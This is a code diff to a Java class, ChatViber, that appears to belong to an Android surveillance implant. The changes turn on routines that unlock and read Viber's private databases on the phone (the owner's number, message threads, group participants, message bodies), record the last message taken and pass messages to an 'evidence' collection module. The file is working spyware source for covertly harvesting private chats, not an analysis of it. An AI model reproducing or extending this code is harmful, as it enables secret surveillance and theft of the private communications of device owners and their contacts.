@@ -34,7 +34,7 @@ public class ChatViber extends SubModuleChat {
 	String dbDir = "/data/data/com.viber.voip/databases";
 	String dbFile = "viber_messages";
 
-	private Hashtable<String, Long> lastViber;
+	private Hashtable<Integer, Long> lastViber;
 	Semaphore readChatSemaphore = new Semaphore(1, true);
 
 	ChatGroups groups = new ChatViberGroups();
@@ -65,7 +65,7 @@ public class ChatViber extends SubModuleChat {
 
 	@Override
 	protected void start() {
-		lastViber = markup.unserialize(new Hashtable<String, Long>());
+		lastViber = markup.unserialize(new Hashtable<Integer, Long>());
 		try {
 			account = readMyPhoneNumber();
 			readViberMessageHistory();
@@ -83,7 +83,7 @@ public class ChatViber extends SubModuleChat {
 	private String readMyPhoneNumber() {
 		String number = "";
 		String file = "/data/data/com.viber.voip/files/preferences/reg_viber_phone_num";
-		
+
 		Path.unprotect(file, 4);
 		FileInputStream fileInputStream;
 		try {
@@ -104,7 +104,7 @@ public class ChatViber extends SubModuleChat {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 		}
-		
+
 		return number;
 	}
 
@@ -147,24 +147,25 @@ public class ChatViber extends SubModuleChat {
 						Check.log(TAG + " (readSkypeMessageHistory) conversation: " + sc.id + " date: "
 								+ sc.date);
 					}
-					/*
+					
 					groups = new ChatViberGroups();
 
 					// retrieves the lastConvId recorded as evidence for this
 					// conversation
-					long lastConvId = lastViber.containsKey(account + peer) ? lastViber.get(account + peer) : 0;
+					long lastConvId = lastViber.containsKey(sc.id) ? lastViber.get(sc.id) : 0;
 
-					if (sc.lastReadIndex > lastConvId) {
-						if (groups.isGroup(peer) && !groups.hasMemoizedGroup(peer)) {
-							fetchGroup(helper, peer);
+					String thread = Integer.toString(sc.id);
+					if (sc.date > lastConvId) {
+						if (groups.isGroup(thread) && !groups.hasMemoizedGroup(thread)) {
+							fetchGroup(helper, sc.id, thread);
 						}
 
 						int lastReadId = (int) fetchMessages(helper, sc, lastConvId);
 						if (lastReadId > 0) {
-							updateMarkupSkype(account + peer, lastReadId, true);
+							updateMarkupViber(sc.id, lastReadId, true);
 						}
 
-					}*/
+					}
 				}
 			} else {
 				if (Cfg.DEBUG) {
@@ -176,114 +177,121 @@ public class ChatViber extends SubModuleChat {
 		}
 
 	}
+
 	
-	/*
-	private int fetchMessages(SQLiteDatabase db, String conversation, int lastReadIndex) {
-		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
+	private long fetchMessages(GenericSqliteHelper helper, final ViberConversation conversation, long lastConvId) {
 
-		String[] projection = new String[] { "id", "author", "body_xml", "timestamp" };
-		String selection = "type == 61 and convo_id = " + conversation.id + " and body_xml != '' and id > " + lastConvId;
+		// select author, body_xml from Messages where convo_id == 118 and id >=
+		// 101 and body_xml != ''
 
-		RecordVisitor visitor = new RecordVisitor(projection, selection) {
+		try {
+			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
-			@Override
-			public long cursor(Cursor cursor) {
-				// I read a line in a conversation.
-				int id = cursor.getInt(0);
-				String peer = cursor.getString(1);
-				String body = cursor.getString(2);
-				long timestamp = cursor.getLong(3);
-				Date date = new Date(timestamp * 1000L);
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (cursor) sc.account: " + conversation.account + " conv.remote: " +conversation.remote + " peer: " + peer);
-				}
-				
-				boolean incoming = !(peer.equals(conversation.account));
-				boolean isGroup = groups.isGroup(conversation.remote);
-				
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (cursor) incoming: " + incoming + " group: " + isGroup);
-				}
-
-				String from, to = null;
-				String fromDisplay, toDisplay = null;
-				
-				from = incoming? peer: conversation.account;
-				fromDisplay = incoming? conversation.displayname : from;
-				
-				if (isGroup) {
-					to = groups.getGroupTo(peer, conversation.remote);
-					toDisplay = to;
-				}else{
-					to = incoming? conversation.account : conversation.remote;
-					toDisplay = incoming? conversation.account : conversation.displayname;
-				}
-
-
-
-				if (!StringUtils.isEmpty(body)) {
-					MessageChat message = new MessageChat(getProgramId(), date, from, fromDisplay, to, toDisplay,
-							body, incoming);
-
-					messages.add(message);
-				}
-
-				return id;
-			}
-		};
-
-		// f_a=messages
-		// Messages.getString("i_2")
-		long newLastId = helper.traverseRecords(Messages.getString("f_a"), visitor);
-
-		if (messages != null && messages.size() > 0) {
-			saveEvidence(messages);
-		}
-
-		return newLastId;
-	} catch (Exception e) {
-		if (Cfg.DEBUG) {
-			e.printStackTrace();
-			Check.log(TAG + " (fetchMessages) Error: " + e);
-		}
-		return -1;
-	}
-	}*/
-
-	private List<ViberConversation> getViberConversations(GenericSqliteHelper helper, final String account) {
-		
-			final List<ViberConversation> conversations = new ArrayList<ViberConversation>();
-
-			String[] projection = new String[] { "_id", "date" };
-			String selection = "date > 0";
+			String[] projection = new String[] { "_id", "person", "body", "date"  };
+			String selection = "thread_id = " + conversation.id + " and date > " + lastConvId;
 
 			RecordVisitor visitor = new RecordVisitor(projection, selection) {
 
 				@Override
 				public long cursor(Cursor cursor) {
-					ViberConversation c = new ViberConversation();
-					c.account = account;
-					c.id = cursor.getInt(0);
-					c.date = cursor.getString(1);
+					// I read a line in a conversation.
+					int id = cursor.getInt(0);
+					String peer = cursor.getString(1);
+					String body = cursor.getString(2);
+					int timestamp = cursor.getInt(3);
+					Date date = new Date(timestamp * 1000L);
 
-					conversations.add(c);
-					return c.id;
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (cursor) sc.account: " + conversation.account + " conv.remote: " +conversation.remote + " peer: " + peer);
+					}
+					
+					boolean incoming = !(peer.equals(conversation.account));
+					boolean isGroup = groups.isGroup(conversation.remote);
+					
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (cursor) incoming: " + incoming + " group: " + isGroup);
+					}
+
+					String from, to = null;
+					String fromDisplay, toDisplay = null;
+					
+					from = incoming? peer: conversation.account;
+					fromDisplay = incoming? conversation.account : from;
+					
+					if (isGroup) {
+						to = groups.getGroupTo(peer, conversation.remote);
+						toDisplay = to;
+					}else{
+						to = incoming? conversation.account : conversation.remote;
+						toDisplay = incoming? conversation.account : conversation.account;
+					}
+
+					if (!StringUtils.isEmpty(body)) {
+						MessageChat message = new MessageChat(getProgramId(), date, from, fromDisplay, to, toDisplay,
+								body, incoming);
+
+						messages.add(message);
+					}
+
+					return id;
 				}
 			};
 
-			helper.traverseRecords("threads", visitor);
-			return conversations;
+			// f_a=messages
+			// Messages.getString("i_2")
+			long newLastId = helper.traverseRecords(Messages.getString("f_a"), visitor);
+
+			if (messages != null && messages.size() > 0) {
+				saveEvidence(messages);
+			}
+
+			return newLastId;
+		} catch (Exception e) {
+			if (Cfg.DEBUG) {
+				e.printStackTrace();
+				Check.log(TAG + " (fetchMessages) Error: " + e);
+			}
+			return -1;
 		}
-	private void fetchGroup(SQLiteDatabase db, final String conversation) {
+
+	}
+
+
+	private List<ViberConversation> getViberConversations(GenericSqliteHelper helper, final String account) {
+
+		final List<ViberConversation> conversations = new ArrayList<ViberConversation>();
+
+		String[] projection = new String[] { "_id", "date", "recipient_number" };
+		String selection = "date > 0";
+
+		RecordVisitor visitor = new RecordVisitor(projection, selection) {
+
+			@Override
+			public long cursor(Cursor cursor) {
+				ViberConversation c = new ViberConversation();
+				c.account = account;
+
+				c.id = cursor.getInt(0);
+				c.date = cursor.getInt(1);
+				c.remote = cursor.getString(2);
+
+				conversations.add(c);
+				return c.id;
+			}
+		};
+
+		helper.traverseRecords("threads", visitor);
+		return conversations;
+	}
+
+	private void fetchGroup(GenericSqliteHelper helper, final int thread_id, final String conversation) {
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (fetchGroup) : " + conversation);
+			Check.log(TAG + " (fetchGroup) : " + thread_id);
 		}
 
-
-		String[] projection = {  "number", "contact_name" };
-		String selection = "thread_id" + "='" + conversation + "'";
+		String[] projection = { "number", "contact_name" };
+		String selection = "thread_id" + "='" + thread_id + "'";
 
 		// final Set<String> remotes = new HashSet<String>();
 		groups.addPeerToGroup(conversation, "-1");
@@ -301,8 +309,6 @@ public class ChatViber extends SubModuleChat {
 			}
 		};
 
-		GenericSqliteHelper helper = new GenericSqliteHelper(db);
-	
 		helper.traverseRecords("participants", visitor);
 
 	}
@@ -313,7 +319,7 @@ public class ChatViber extends SubModuleChat {
 		SQLiteQueryBuilder queryBuilderIndex = new SQLiteQueryBuilder();
 		queryBuilderIndex.setTables("threads");
 
-		String[] projection = {  "thread_id", "address",	"date", "body", "person" };
+		String[] projection = { "thread_id", "address", "date", "body", "person" };
 		Cursor cursor = queryBuilderIndex.query(db, projection, null, null, null, null, null);
 
 		// iterate conversation indexes
@@ -346,4 +352,29 @@ public class ChatViber extends SubModuleChat {
 		cursor.close();
 		return changedConversations;
 	}
+	
+	private void updateMarkupViber(int thread_id, long newLastId, boolean serialize) {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (updateMarkupSkype), mailStore: " + thread_id + " +lastId: " + newLastId);
+		}
+
+		lastViber.put(thread_id, newLastId);
+		try {
+			if (serialize || (newLastId % 10 == 0)) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (updateMarkupSkype), write lastId: " + newLastId);
+				}
+				markup.writeMarkupSerializable(lastViber);
+			}
+		} catch (IOException e) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (updateMarkupSkype) Error: " + e);
+			}
+		}
+	}
+	
+	public void saveEvidence(ArrayList<MessageChat> messages) {
+		getModule().saveEvidence(messages);
+	}
+
 }
